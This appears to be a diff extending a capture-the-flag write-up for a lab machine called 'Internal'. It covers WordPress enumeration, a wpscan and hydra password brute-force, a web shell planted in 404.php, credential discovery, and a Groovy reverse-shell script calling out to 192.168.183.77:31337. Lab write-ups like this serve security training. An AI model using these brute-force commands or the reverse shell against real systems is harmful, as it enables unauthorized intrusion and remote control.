@@ -1,8 +1,10 @@
 # Internal
 
-#Linux 
+#Linux #Wordpress #Linux #PrivEsc 
 
 # Recon
+
+I started running nmap and I got the result:
 
 ```
 $ nmap -sV -sC -p- 10.66.179.64 
@@ -24,6 +26,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 145.73 seconds
 ```
+
+Next, I used ffuf to find some possible directories.
 
 ```
 $ ffuf -H "User-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.3" -u http://10.66.179.64/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt        
@@ -58,6 +62,20 @@ server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration:
 
 ```
 
+## Exploiting
+
+First, I need to ensure that I've modified my hosts file to reflect `internal.thm`.
+
+I found an interesting directory called `wordpress`.
+
+<figure><img src="internal-1.png" alt=""><figcaption></figcaption></figure>
+
+I noticed that there is a login page `wp-login.php` hide in the `blog` directory.
+
+<figure><img src="internal-2.png" alt=""><figcaption></figcaption></figure>
+
+I was able to enumerate the `admin` user trying manually and by running wpscan.
+
 ```
 $ wpscan --url http://internal.thm/wordpress --enumerate u --api-token X4yaOp3ZWgd...
 ```
@@ -73,11 +91,22 @@ $ wpscan --url http://internal.thm/wordpress --enumerate u --api-token X4yaOp3ZW
  |  Login Error Messages (Aggressive Detection)
 ```
 
+I was also able to discover the password by brute force, using a wordlist to find it.
 
 ```
 $ wpscan --url http://internal.thm/wordpress --usernames admin --passwords /usr/share/wordlists/rockyou.txt --api-token X4yaOp3ZWgdk
 ```
 
+<figure><img src="internal-3.png" alt=""><figcaption></figcaption></figure>
+
+Once I can log in wordpress, I can use a webshell to gain access to the machine. I edited the 404.php file so what then this page is accessed, I will get the shell.
+
+<figure><img src="internal-4.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="internal-5.png" alt=""><figcaption></figcaption></figure>
+## Privilege Escalation
+
+I started to looking for some interesting config files. 
 
 ```
 $ cat wp-config.php 
@@ -117,28 +146,44 @@ define( 'DB_HOST', 'localhost' );
 
 ```
 
+I also tried to list aubreanna's files, but I didn't have permission to access her folder.
 
 ```
-[i] Plugin(s) Identified:
+www-data@internal:/home$ ls -la
+total 12
+drwxr-xr-x  3 root      root      4096 Aug  3  2020 .
+drwxr-xr-x 24 root      root      4096 Aug  3  2020 ..
+drwx------  7 aubreanna aubreanna 4096 Aug  3  2020 aubreanna
+www-data@internal:/home$ cd aubreanna/
+bash: cd: aubreanna/: Permission denied
+```
 
-[+] akismet
- | Location: http://10.66.179.64/wordpress/wp-content/plugins/akismet/
- | Latest Version: 5.6
- | Last Updated: 2025-11-12T16:31:00.000Z
- |
- | Found By: Known Locations (Aggressive Detection)
- |  - http://10.66.179.64/wordpress/wp-content/plugins/akismet/, status: 500
- |
- | [!] 1 vulnerability identified:
- |
- | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
- |     Fixed in: 3.1.5
- |     References:
- |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
- |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
- |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
- |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
- |
- | The version could not be determined.
+I found a file called `wp-save.txt` on `/opt` folder.
 
+<figure><img src="internal-6.png" alt=""><figcaption></figcaption></figure>
+
+Looks interesting! Let's try to access via ssh with these credentials. 
+
+<figure><img src="internal-7.png" alt=""><figcaption></figcaption></figure>
+
+
+
+```
+$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 4444 -V -f http-form-post '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password'
+```
+
+
+```
+Thread.start {
+String host="192.168.183.77";
+int port=31337;
+String cmd="/bin/sh";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+}
+```
+
+
+
+```
+www-data@internal:/home$ find / -perm /4000 2>/dev/null
 ```
